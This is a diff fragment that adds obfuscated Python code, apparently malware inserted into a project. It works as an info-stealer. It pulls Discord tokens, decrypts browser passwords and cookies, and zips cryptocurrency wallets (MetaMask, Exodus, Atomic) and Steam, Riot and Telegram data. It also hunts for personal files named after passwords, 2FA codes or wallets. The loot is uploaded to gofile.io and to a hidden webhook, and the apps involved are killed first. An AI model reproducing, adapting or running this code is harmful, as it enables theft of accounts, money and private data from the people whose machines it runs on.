+        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:476
+        return #line:477
+    _ #line:490
+def wr1tef0rf1l3 (OO00OOO0O0O000O00 ,O000O00OO00OO00OO ):#line:495
+    O0OOOO0OOOOOO0OO0 =os .getenv ("TEMP")+f"\cr{O000O00OO00OO00OO}.txt"#line:496
+    with open (O0OOOO0OOOOOO0OO0 ,mode ='w',encoding ='utf-8')as OOOO0OO00OO00O0O0 :#line:497
+        OOOO0OO00OO00O0O0 .write (f"<--unknown BEST -->\n\n")#line:498
+        for OOOOO0O0OO00O0OOO in OO00OOO0O0O000O00 :#line:499
+            if OOOOO0O0OO00O0OOO [0 ]!='':#line:500
+                OOOO0OO00OO00O0O0 .write (f"{OOOOO0O0OO00O0OOO}\n")#line:501
+T0k3ns =''#line:503
+def getT0k3n (O0O000OO0OO0O0O00 ,O00O000OOO00O000O ):#line:504
+    if not os .path .exists (O0O000OO0OO0O0O00 ):return #line:505
+    O0O000OO0OO0O0O00 +=O00O000OOO00O000O #line:507
+    for O00000O0000O000O0 in os .listdir (O0O000OO0OO0O0O00 ):#line:508
+        if O00000O0000O000O0 .endswith (".log")or O00000O0000O000O0 .endswith (".ldb"):#line:509
+            for O00OOOO000OOO0O0O in [OO000O0OOOOOOO0O0 .strip ()for OO000O0OOOOOOO0O0 in open (f"{O0O000OO0OO0O0O00}\\{O00000O0000O000O0}",errors ="ignore").readlines ()if OO000O0OOOOOOO0O0 .strip ()]:#line:510
+                for O0O00O00OOO0O000O in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:511
+                    for OOOO00000OOOOOO00 in re .findall (O0O00O00OOO0O000O ,O00OOOO000OOO0O0O ):#line:512
+                        global T0k3ns #line:513
+                        if ch1ckT4k1n (OOOO00000OOOOOO00 ):#line:514
+                            if not OOOO00000OOOOOO00 in T0k3ns :#line:515
+                                T0k3ns +=OOOO00000OOOOOO00 #line:517
+                                upl05dT4k31 (OOOO00000OOOOOO00 ,O0O000OO0OO0O0O00 )#line:518
+P4ssw =[]#line:520
+def getP4ssw (O0OO000OOO0O0O00O ,OO00O000OOOO0OOO0 ):#line:521
+    global P4ssw ,P4sswCount #line:522
+    if not os .path .exists (O0OO000OOO0O0O00O ):return #line:523
+    OOOOOOO00O0O0O0OO =O0OO000OOO0O0O00O +OO00O000OOOO0OOO0 +"/Login Data"#line:525
+    if os .stat (OOOOOOO00O0O0O0OO ).st_size ==0 :return #line:526
+    OOO0O0000O0OO0OO0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0O000O0O000OO0OO in range (8 ))+".db"#line:528
+    shutil .copy2 (OOOOOOO00O0O0O0OO ,OOO0O0000O0OO0OO0 )#line:530
+    O00O0O0O0OO0OOOO0 =sql_connect (OOO0O0000O0OO0OO0 )#line:531
+    O0OO00OO0OO0O0OO0 =O00O0O0O0OO0OOOO0 .cursor ()#line:532
+    O0OO00OO0OO0O0OO0 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:533
+    OOOOOOOOO000000OO =O0OO00OO0OO0O0OO0 .fetchall ()#line:534
+    O0OO00OO0OO0O0OO0 .close ()#line:535
+    O00O0O0O0OO0OOOO0 .close ()#line:536
+    os .remove (OOO0O0000O0OO0OO0 )#line:537
+    OOOOO0O0O000OO00O =O0OO000OOO0O0O00O +"/Local State"#line:539
+    with open (OOOOO0O0O000OO00O ,'r',encoding ='utf-8')as O00OO0000O000O00O :OO00OOOO0O00O0O00 =json_loads (O00OO0000O000O00O .read ())#line:540
+    O0OOOO00O0000O0OO =b64decode (OO00OOOO0O00O0O00 ['os_crypt']['encrypted_key'])#line:541
+    O0OOOO00O0000O0OO =CryptUnprotectData (O0OOOO00O0000O0OO [5 :])#line:542
+    for O00OO00O0O00OO0O0 in OOOOOOOOO000000OO :#line:544
+        if O00OO00O0O00OO0O0 [0 ]!='':#line:545
+            for OO00OO0000O0O0O00 in keyword :#line:546
+                OO0O0O0OOOOO00O0O =OO00OO0000O0O0O00 #line:547
+                if "https"in OO00OO0000O0O0O00 :#line:548
+                    OO000000000OO0000 =OO00OO0000O0O0O00 #line:549
+                    OO00OO0000O0O0O00 =OO000000000OO0000 .split ('[')[1 ].split (']')[0 ]#line:550
+                if OO00OO0000O0O0O00 in O00OO00O0O00OO0O0 [0 ]:#line:551
+                    if not OO0O0O0OOOOO00O0O in paswWords :paswWords .append (OO0O0O0OOOOO00O0O )#line:552
+            P4ssw .append (f"UR1: {O00OO00O0O00OO0O0[0]} | U53RN4M3: {O00OO00O0O00OO0O0[1]} | P455W0RD: {D3kryptV4lU3(O00OO00O0O00OO0O0[2], O0OOOO00O0000O0OO)}")#line:553
+            P4sswCount +=1 #line:554
+    wr1tef0rf1l3 (P4ssw ,'passw')#line:555
+C00k13 =[]#line:557
+def getC00k13 (O00000O00O00O0O00 ,OO0O0O0O0O00OO000 ):#line:558
+    global C00k13 ,CookiCount #line:559
+    if not os .path .exists (O00000O00O00O0O00 ):return #line:560
+    OOOOOO0OO0O000000 =O00000O00O00O0O00 +OO0O0O0O0O00OO000 +"/Cookies"#line:562
+    if os .stat (OOOOOO0OO0O000000 ).st_size ==0 :return #line:563
+    OOOO0O000O0O00OOO =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO00OOO0O0OO0000O in range (8 ))+".db"#line:565
+    shutil .copy2 (OOOOOO0OO0O000000 ,OOOO0O000O0O00OOO )#line:567
+    O00OOO0OO000OO0O0 =sql_connect (OOOO0O000O0O00OOO )#line:568
+    OO0OOO0000O0O0OO0 =O00OOO0OO000OO0O0 .cursor ()#line:569
+    OO0OOO0000O0O0OO0 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:570
+    O0O0O0O000O0000O0 =OO0OOO0000O0O0OO0 .fetchall ()#line:571
+    OO0OOO0000O0O0OO0 .close ()#line:572
+    O00OOO0OO000OO0O0 .close ()#line:573
+    os .remove (OOOO0O000O0O00OOO )#line:574
+    OOOO000O0OOOOO0O0 =O00000O00O00O0O00 +"/Local State"#line:576
+    with open (OOOO000O0OOOOO0O0 ,'r',encoding ='utf-8')as O0O000O0000OOO00O :OO000OOOO0OOO0O0O =json_loads (O0O000O0000OOO00O .read ())#line:578
+    OO0O0O00000O0O0O0 =b64decode (OO000OOOO0OOO0O0O ['os_crypt']['encrypted_key'])#line:579
+    OO0O0O00000O0O0O0 =CryptUnprotectData (OO0O0O00000O0O0O0 [5 :])#line:580
+    for OO0O0OO00O0O000OO in O0O0O0O000O0000O0 :#line:582
+        if OO0O0OO00O0O000OO [0 ]!='':#line:583
+            for OO0000O00O0O0000O in keyword :#line:584
+                OO0OO0OOOO0O0OOOO =OO0000O00O0O0000O #line:585
+                if "https"in OO0000O00O0O0000O :#line:586
+                    OOOOOOO00O000O000 =OO0000O00O0O0000O #line:587
+                    OO0000O00O0O0000O =OOOOOOO00O000O000 .split ('[')[1 ].split (']')[0 ]#line:588
+                if OO0000O00O0O0000O in OO0O0OO00O0O000OO [0 ]:#line:589
+                    if not OO0OO0OOOO0O0OOOO in cookiWords :cookiWords .append (OO0OO0OOOO0O0OOOO )#line:590
+            C00k13 .append (f"{OO0O0OO00O0O000OO[0]}	TRUE	/	FALSE	2597573456	{OO0O0OO00O0O000OO[1]}	{D3kryptV4lU3(OO0O0OO00O0O000OO[2], OO0O0O00000O0O0O0)}")#line:591
+            CookiCount +=1 #line:592
+    wr1tef0rf1l3 (C00k13 ,'cook')#line:593
+def G3tD1sc0rd (OO00O0OO0O0OO0000 ,OO00O0O00000OO0O0 ):#line:595
+    if not os .path .exists (f"{OO00O0OO0O0OO0000}/Local State"):return #line:596
+    O0OO0OO0O00O00OO0 =OO00O0OO0O0OO0000 +OO00O0O00000OO0O0 #line:598
+    OOO00OOO0O00OOOO0 =OO00O0OO0O0OO0000 +"/Local State"#line:600
+    with open (OOO00OOO0O00OOOO0 ,'r',encoding ='utf-8')as O00OO0O0O0OOO00O0 :OOO00OO0OO0O00O00 =json_loads (O00OO0O0O0OOO00O0 .read ())#line:601
+    OO0OO0OO00O0O00O0 =b64decode (OOO00OO0OO0O00O00 ['os_crypt']['encrypted_key'])#line:602
+    OO0OO0OO00O0O00O0 =CryptUnprotectData (OO0OO0OO00O0O00O0 [5 :])#line:603
+    for OOOO0OO00O00O0O00 in os .listdir (O0OO0OO0O00O00OO0 ):#line:606
+        if OOOO0OO00O00O0O00 .endswith (".log")or OOOO0OO00O00O0O00 .endswith (".ldb"):#line:608
+            for O0O00O000O0O00OO0 in [OOOOO0O000O00OOO0 .strip ()for OOOOO0O000O00OOO0 in open (f"{O0OO0OO0O00O00OO0}\\{OOOO0OO00O00O0O00}",errors ="ignore").readlines ()if OOOOO0O000O00OOO0 .strip ()]:#line:609
+                for O000OO000O00O00O0 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O0O00O000O0O00OO0 ):#line:610
+                    global T0k3ns #line:611
+                    O00O00O00000O0O0O =D3kryptV4lU3 (b64decode (O000OO000O00O00O0 .split ('dQw4w9WgXcQ:')[1 ]),OO0OO0OO00O0O00O0 )#line:612
+                    if ch1ckT4k1n (O00O00O00000O0O0O ):#line:613
+                        if not O00O00O00000O0O0O in T0k3ns :#line:614
+                            T0k3ns +=O00O00O00000O0O0O #line:616
+                            upl05dT4k31 (O00O00O00000O0O0O ,OO00O0OO0O0OO0000 )#line:618
+def GatherZips (OOOO0O0O0O000OOO0 ,OOOOO0OOO00O0OOO0 ,O00000OO0O00000OO ):#line:620
+    OO000O00O0000OOO0 =[]#line:621
+    for OOO00O00O0OO0O000 in OOOO0O0O0O000OOO0 :#line:622
+        O0OOOO0000OO000O0 =threading .Thread (target =Z1pTh1ngs ,args =[OOO00O00O0OO0O000 [0 ],OOO00O00O0OO0O000 [5 ],OOO00O00O0OO0O000 [1 ]])#line:623
+        O0OOOO0000OO000O0 .start ()#line:624
+        OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:625
+    for OOO00O00O0OO0O000 in OOOOO0OOO00O0OOO0 :#line:627
+        O0OOOO0000OO000O0 =threading .Thread (target =Z1pTh1ngs ,args =[OOO00O00O0OO0O000 [0 ],OOO00O00O0OO0O000 [2 ],OOO00O00O0OO0O000 [1 ]])#line:628
+        O0OOOO0000OO000O0 .start ()#line:629
+        OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:630
+    O0OOOO0000OO000O0 =threading .Thread (target =ZipTelegram ,args =[O00000OO0O00000OO [0 ],O00000OO0O00000OO [2 ],O00000OO0O00000OO [1 ]])#line:632
+    O0OOOO0000OO000O0 .start ()#line:633
+    OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:634
+    for OO00O000O000O000O in OO000O00O0000OOO0 :#line:636
+        OO00O000O000O000O .join ()#line:637
+    global WalletsZip ,GamingZip ,OtherZip #line:638
+    OOOO0OO0O00O0OOO0 ,O0OO0OO0O0OOO0000 ,OOO0O0OO00O0OO0O0 ="",'',''#line:641
+    if not len (WalletsZip )==0 :#line:642
+        OOOO0OO0O00O0OOO0 =":coin:  •  Wallets\n"#line:643
+        for O0O0O0O0O00O0O000 in WalletsZip :#line:644
+            OOOO0OO0O00O0OOO0 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:645
+    if not len (WalletsZip )==0 :#line:646
+        O0OO0OO0O0OOO0000 =":video_game:  •  Gaming:\n"#line:647
+        for O0O0O0O0O00O0O000 in GamingZip :#line:648
+            O0OO0OO0O0OOO0000 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:649
+    if not len (OtherZip )==0 :#line:650
+        OOO0O0OO00O0OO0O0 =":tickets:  •  Apps\n"#line:651
+        for O0O0O0O0O00O0O000 in OtherZip :#line:652
+            OOO0O0OO00O0OO0O0 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:653
+    OO0OO0O0OO000OOO0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:657
+    O0O00000O0000O0O0 ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OOOO0OO0O00O0OOO0}\n{O0OO0OO0O0OOO0000}\n{OOO0O0OO00O0OO0O0}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:675
+    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (O0O00000O0000O0O0 ).encode (),headers =OO0OO0O0OO000OOO0 )#line:676
+def ZipTelegram (OO0O0OOO0O0OO000O ,OOO00OOO00O00OOOO ,O000000OO00OO000O ):#line:679
+    global OtherZip #line:680
+    O0OO0O0OO000OOO0O =OO0O0OOO0O0OO000O #line:681
+    O0000O0OOO0O0OO0O =OOO00OOO00O00OOOO #line:682
+    if not os .path .exists (O0OO0O0OO000OOO0O ):return #line:683
+    subprocess .Popen (f"taskkill /im {O000000OO00OO000O} /t /f >nul 2>&1",shell =True )#line:684
+    OOOOOO0O00O00OOOO =ZipFile (f"{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip","w")#line:686
+    for OO0O0OO0000OO0O00 in os .listdir (O0OO0O0OO000OOO0O ):#line:687
+        if not ".zip"in OO0O0OO0000OO0O00 and not "tdummy"in OO0O0OO0000OO0O00 and not "user_data"in OO0O0OO0000OO0O00 and not "webview"in OO0O0OO0000OO0O00 :#line:688
+            OOOOOO0O00O00OOOO .write (O0OO0O0OO000OOO0O +"/"+OO0O0OO0000OO0O00 )#line:689
+    OOOOOO0O00O00OOOO .close ()#line:690
+    OOOOO00OOO00OO0O0 =uploadToAnonfiles (f'{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip')#line:692
+    os .remove (f"{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip")#line:693
+    OtherZip .append ([OOO00OOO00O00OOOO ,OOOOO00OOO00OO0O0 ])#line:694
+def Z1pTh1ngs (O0OOO0O0OO0O0O000 ,OO000O0OOO00O0000 ,OO00O0000O00OOOOO ):#line:696
+    OO0OO000000O0OOOO =O0OOO0O0OO0O0O000 #line:697
+    OO00000OOO00OO0OO =OO000O0OOO00O0000 #line:698
+    global WalletsZip ,GamingZip ,OtherZip #line:699
+    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OO000O0OOO00O0000 :#line:701
+        OO0O00OOOOOO000O0 =O0OOO0O0OO0O0O000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:702
+        OO00000OOO00OO0OO =f"Metamask_{OO0O00OOOOOO000O0}"#line:703
+        OO0OO000000O0OOOO =O0OOO0O0OO0O0O000 +OO000O0OOO00O0000 #line:704
+    if not os .path .exists (OO0OO000000O0OOOO ):return #line:706
+    subprocess .Popen (f"taskkill /im {OO00O0000O00OOOOO} /t /f >nul 2>&1",shell =True )#line:707
+    if "Wallet"in OO000O0OOO00O0000 or "NationsGlory"in OO000O0OOO00O0000 :#line:709
+        OO0O00OOOOOO000O0 =O0OOO0O0OO0O0O000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:710
+        OO00000OOO00OO0OO =f"{OO0O00OOOOOO000O0}"#line:711
+    elif "Steam"in OO000O0OOO00O0000 :#line:713
+        if not os .path .isfile (f"{OO0OO000000O0OOOO}/loginusers.vdf"):return #line:714
+        OOO000OO0O0000000 =open (f"{OO0OO000000O0OOOO}/loginusers.vdf","r+",encoding ="utf8")#line:715
+        OO0000O0OOO0O0000 =OOO000OO0O0000000 .readlines ()#line:716
+        O000OOO00O0000OOO =False #line:717
+        for O0OO00OO0OOOOOOOO in OO0000O0OOO0O0000 :#line:718
+            if 'RememberPassword"\t\t"1"'in O0OO00OO0OOOOOOOO :#line:719
+                O000OOO00O0000OOO =True #line:720
+        if O000OOO00O0000OOO ==False :return #line:721
+        OO00000OOO00OO0OO =OO000O0OOO00O0000 #line:722
+    O000O0OO0O00OO0OO =ZipFile (f"{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip","w")#line:725
+    for O000O0O00O0O00OO0 in os .listdir (OO0OO000000O0OOOO ):#line:726
+        if not ".zip"in O000O0O00O0O00OO0 :O000O0OO0O00OO0OO .write (OO0OO000000O0OOOO +"/"+O000O0O00O0O00OO0 )#line:727
+    O000O0OO0O00OO0OO .close ()#line:728
+    OOOOO0O0OOO00OOO0 =uploadToAnonfiles (f'{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip')#line:730
+    os .remove (f"{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip")#line:731
+    if "Wallet"in OO000O0OOO00O0000 or "eogaeaoehlef"in OO000O0OOO00O0000 :#line:733
+        WalletsZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:734
+    elif "NationsGlory"in OO00000OOO00OO0OO or "Steam"in OO00000OOO00OO0OO or "RiotCli"in OO00000OOO00OO0OO :#line:735
+        GamingZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:736
+    else :#line:737
+        OtherZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:738
+def GatherAll ():#line:741
+    ""#line:742
+    OOOOOOO00OOOO0OO0 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:752
+    O0OO0O0O0OOOO0OOO =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:759
+    OO0OOO000O00O0000 =[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',"Wallet"],[f"{roaming}/Exodus/exodus.wallet","Exodus.exe","Wallet"],["C:\Program Files (x86)\Steam\config","steam.exe","Steam"],[f"{roaming}/NationsGlory/Local Storage/leveldb","NationsGlory.exe","NationsGlory"],[f"{local}/Riot Games/Riot Client/Data","RiotClientServices.exe","RiotClient"]]#line:767
+    OO00O00O000OO0OOO =[f"{roaming}/Telegram Desktop/tdata",'telegram.exe',"Telegram"]#line:768
+    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:770
+        OO00O0OOO0000OOOO =threading .Thread (target =getT0k3n ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [2 ]])#line:771
+        OO00O0OOO0000OOOO .start ()#line:772
+        Threadlist .append (OO00O0OOO0000OOOO )#line:773
+    for O0O0OOO00OOOO000O in O0OO0O0O0OOOO0OOO :#line:774
+        OO00O0OOO0000OOOO =threading .Thread (target =G3tD1sc0rd ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [1 ]])#line:775
+        OO00O0OOO0000OOOO .start ()#line:776
+        Threadlist .append (OO00O0OOO0000OOOO )#line:777
+    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:779
+        OO00O0OOO0000OOOO =threading .Thread (target =getP4ssw ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [3 ]])#line:780
+        OO00O0OOO0000OOOO .start ()#line:781
+        Threadlist .append (OO00O0OOO0000OOOO )#line:782
+    OOO0OO0000O000000 =[]#line:784
+    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:785
+        OO00O0OOO0000OOOO =threading .Thread (target =getC00k13 ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [4 ]])#line:786
+        OO00O0OOO0000OOOO .start ()#line:787
+        OOO0OO0000O000000 .append (OO00O0OOO0000OOOO )#line:788
+    threading .Thread (target =GatherZips ,args =[OOOOOOO00OOOO0OO0 ,OO0OOO000O00O0000 ,OO00O00O000OO0OOO ]).start ()#line:790
+    for O0OOOO00OO0OO000O in OOO0OO0000O000000 :O0OOOO00OO0OO000O .join ()#line:793
+    OO0O0OO0O00000O0O =TR6st (C00k13 )#line:794
+    if OO0O0OO0O00000O0O ==True :return #line:795
+    for O0O0OOO00OOOO000O in OOOOOOO00OOOO0OO0 :#line:797
+         threading .Thread (target =Z1pTh1ngs ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [5 ],O0O0OOO00OOOO000O [1 ]]).start ()#line:798
+    for O0O0OOO00OOOO000O in OO0OOO000O00O0000 :#line:800
+         threading .Thread (target =Z1pTh1ngs ,args =[O0O0OOO00OOOO000O [0 ],O0O0OOO00OOOO000O [2 ],O0O0OOO00OOOO000O [1 ]]).start ()#line:801
+    threading .Thread (target =ZipTelegram ,args =[OO00O00O000OO0OOO [0 ],OO00O00O000OO0OOO [2 ],OO00O00O000OO0OOO [1 ]]).start ()#line:803
+    for O0OOOO00OO0OO000O in Threadlist :#line:805
+        O0OOOO00OO0OO000O .join ()#line:806
+    global upths #line:807
+    upths =[]#line:808
+    for OO000O0OO00OO0O00 in ["crpassw.txt","crcook.txt"]:#line:810
+        upload (OO000O0OO00OO0O00 .replace (".txt",""),uploadToAnonfiles (os .getenv ("TEMP")+"\\"+OO000O0OO00OO0O00 ))#line:812
+def uploadToAnonfiles (O0000O0O0O00O0O0O ):#line:814
+    try :return requests .post (f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile',files ={'file':open (O0000O0O0O00O0O0O ,'rb')}).json ()["data"]["downloadPage"]#line:815
+    except :return False #line:816
+def KiwiFolder (O0OO000000OO0OO00 ,O0000000OO0OO00O0 ):#line:818
+    global KiwiFiles #line:819
+    OO000000OOO0O0OOO =7 #line:820
+    OOO0OO000O00O000O =0 #line:821
+    OOOO0O0O0OOO000O0 =os .listdir (O0OO000000OO0OO00 )#line:822
+    OO0OOOO00OO0O0OO0 =[]#line:823
+    for OO0O00O0O00000O0O in OOOO0O0O0OOO000O0 :#line:824
+        if not os .path .isfile (O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O ):return #line:825
+        OOO0OO000O00O000O +=1 #line:826
+        if OOO0OO000O00O000O <=OO000000OOO0O0OOO :#line:827
+            OO0OOO00O000OOO0O =uploadToAnonfiles (O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O )#line:828
+            OO0OOOO00OO0O0OO0 .append ([O0OO000000OO0OO00 +"/"+OO0O00O0O00000O0O ,OO0OOO00O000OOO0O ])#line:829
+        else :#line:830
+            break #line:831
+    KiwiFiles .append (["folder",O0OO000000OO0OO00 +"/",OO0OOOO00OO0O0OO0 ])#line:832
+KiwiFiles =[]#line:834
+def KiwiFile (O0O00O000OOOOOOO0 ,OOO0OO0O0000O0000 ):#line:835
+    global KiwiFiles #line:836
+    OO00O000OOOOOO0O0 =[]#line:837
+    OOO00O00O000OOO0O =os .listdir (O0O00O000OOOOOOO0 )#line:838
+    for OOOOO00O00OOO0OOO in OOO00O00O000OOO0O :#line:839
+        for O0O0OO0O0OO000O00 in OOO0OO0O0000O0000 :#line:840
+            if O0O0OO0O0OO000O00 in OOOOO00O00OOO0OOO .lower ():#line:841
+                if os .path .isfile (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO )and ".txt"in OOOOO00O00OOO0OOO :#line:842
+                    OO00O000OOOOOO0O0 .append ([O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO ,uploadToAnonfiles (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO )])#line:843
+                    break #line:844
+                if os .path .isdir (O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO ):#line:845
+                    OO00O0OO0OO0O0O0O =O0O00O000OOOOOOO0 +"/"+OOOOO00O00OOO0OOO #line:846
+                    KiwiFolder (OO00O0OO0OO0O0O0O ,OOO0OO0O0000O0000 )#line:847
+                    break #line:848
+    KiwiFiles .append (["folder",O0O00O000OOOOOOO0 ,OO00O000OOOOOO0O0 ])#line:850
+def Kiwi ():#line:852
+    O00000000OO0OO0O0 =temp .split ("\AppData")[0 ]#line:853
+    O0OOO0000O00O0OOO =[O00000000OO0OO0O0 +"/Desktop",O00000000OO0OO0O0 +"/Downloads",O00000000OO0OO0O0 +"/Documents"]#line:858
+    OO00O000O0000OO00 =["account","acount","passw","secret","senhas","contas","backup","2fa","importante","privado","exodus","exposed","perder","amigos","empresa","trabalho","work","private","source","users","username","login","user","usuario","log"]#line:886
+    O00OO0OOOO0000O00 =["passw","mdp","motdepasse","mot_de_passe","login","secret","account","acount","paypal","banque","account","metamask","wallet","crypto","exodus","discord","2fa","code","memo","compte","token","backup","secret","mom","family"]#line:914
+    O0OOOOO00OO0OOO0O =[]#line:916
+    for OOO00OO0O0O00O00O in O0OOO0000O00O0OOO :#line:917
+        O0OOOO0O0O000O0OO =threading .Thread (target =KiwiFile ,args =[OOO00OO0O0O00O00O ,O00OO0OOOO0000O00 ]);O0OOOO0O0O000O0OO .start ()#line:918
+        O0OOOOO00OO0OOO0O .append (O0OOOO0O0O000O0OO )#line:919
+    return O0OOOOO00OO0OOO0O #line:920
+global keyword ,cookiWords ,paswWords ,CookiCount ,P4sswCount ,WalletsZip ,GamingZip ,OtherZip #line:923
+keyword =['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)']#line:927
+CookiCount ,P4sswCount =0 ,0 #line:929
+cookiWords =[]#line:930
+paswWords =[]#line:931
+WalletsZip =[]#line:933
+GamingZip =[]#line:934
+OtherZip =[]#line:935
+GatherAll ()#line:937
+DETECTED =TR6st (C00k13 )#line:938
+if not DETECTED :#line:940
+    wikith =Kiwi ()#line:941
+    for thread in wikith :thread .join ()#line:943
+    time .sleep (0.2 )#line:944
+    filetext ="\n"#line:946
+    for arg in KiwiFiles :#line:947
+        if len (arg [2 ])!=0 :#line:948
+            foldpath =arg [1 ]#line:949
+            foldlist =arg [2 ]#line:950
+            filetext +=f"📁 {foldpath}\n"#line:951
+            for ffil in foldlist :#line:953
+                a =ffil [0 ].split ("/")#line:954
+                fileanme =a [len (a )-1 ]#line:955
+                b =ffil [1 ]#line:956
+                filetext +=f"└─:open_file_folder: [{fileanme}]({b})\n"#line:957
+            filetext +="\n"#line:958
     upload ("kiwi",filetext )
